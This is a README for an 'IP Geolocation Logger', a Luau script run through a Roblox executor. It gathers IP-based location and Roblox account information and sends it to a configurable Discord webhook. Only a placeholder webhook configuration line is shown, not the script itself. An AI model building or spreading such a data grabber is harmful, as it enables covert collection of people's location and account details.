# IP Geolocation Logger
A script that logs geolocation data and Roblox account information, then sends it to a [Discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) using a Roblox executor.

## Showcase
![](showcase.jpg)

## Features
- Simple, and easy to use.
- Fully costumizable webhook URL.
- Lightweight, and optimized for performance.
- Retrieves geolocation data (country, city, etc.) using an [IP Geolocation API](https://ipapi.co/).
- Retrieves Roblox account information (avatar, profile, etc.) using a [Thumbnails API](https://create.roblox.com/docs/cloud/legacy/thumbnails/v1#/).

## Usage
Before using IP Geolocation Logger, make sure to configure it by setting `getgenv()["Webhook URL"]` to your Discord webhook URL as a string in the script. Example:
```luau
getgenv()["Webhook URL"] = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
```
After configuring, you can directly use IP Geolocation Logger by running [`loader.luau`](loader.luau) in your Roblox executor.

## Notes
- This script doesn't support any actions that violate [Roblox's Terms of Use](https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use).
- The script runs only on a Roblox executor that fully supports UNC (Unified Naming Convention).

## License
This project is licensed under the MIT License. See the [`LICENSE`](LICENSE) file for more details.
